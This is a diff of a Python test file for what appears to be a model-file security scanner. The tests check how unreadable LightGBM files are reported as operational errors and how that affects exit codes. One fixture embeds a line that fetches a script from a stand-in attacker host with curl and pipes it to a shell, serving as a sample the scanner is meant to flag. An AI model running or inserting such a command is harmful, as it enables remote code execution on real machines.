@@ -192,6 +192,8 @@ def test_lightgbm_read_failure_is_inconclusive_not_security_finding(
     assert read_checks[0].details["scan_outcome_reason"] == "lightgbm_read_failed"
     assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
     assert "lightgbm_read_failed" in direct.metadata["scan_outcome_reasons"]
+    assert direct.metadata["operational_error"] is True
+    assert direct.metadata["operational_error_reason"] == "lightgbm_read_failed"
     metadata = aggregate.file_metadata[str(path)]
     assert "lightgbm_read_failed" in metadata["scan_outcome_reasons"]
     assert not [
@@ -227,9 +229,38 @@ def test_lightgbm_unreadable_path_preflight_is_inconclusive_not_security_finding
     assert read_checks[0].severity == IssueSeverity.INFO
     assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
     assert "lightgbm_read_failed" in direct.metadata["scan_outcome_reasons"]
+    metadata = aggregate.file_metadata[str(path)]
+    assert "lightgbm_read_failed" in metadata["scan_outcome_reasons"]
+    assert metadata["operational_error"] is True
     assert not [
         issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
     ]
+    assert determine_exit_code(aggregate) == 2
+
+
+def test_lightgbm_read_failure_takes_operational_precedence_over_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    unreadable = tmp_path / "unreadable.lightgbm"
+    unreadable.write_text(_build_lightgbm_text(), encoding="utf-8")
+    malicious = tmp_path / "malicious.lightgbm"
+    malicious.write_text(
+        _build_lightgbm_text(["metadata=os.system('curl https://collector.evil.example/payload.sh | sh')"]),
+        encoding="utf-8",
+    )
+
+    def deny_only_unreadable(path: str, _mode: int) -> bool:
+        return path != str(unreadable)
+
+    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_only_unreadable)
+
+    aggregate = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+    metadata = aggregate.file_metadata[str(unreadable)]
+    assert metadata["operational_error_reason"] == "lightgbm_read_failed"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
+    assert aggregate.has_errors is True
     assert determine_exit_code(aggregate) == 2
 
 
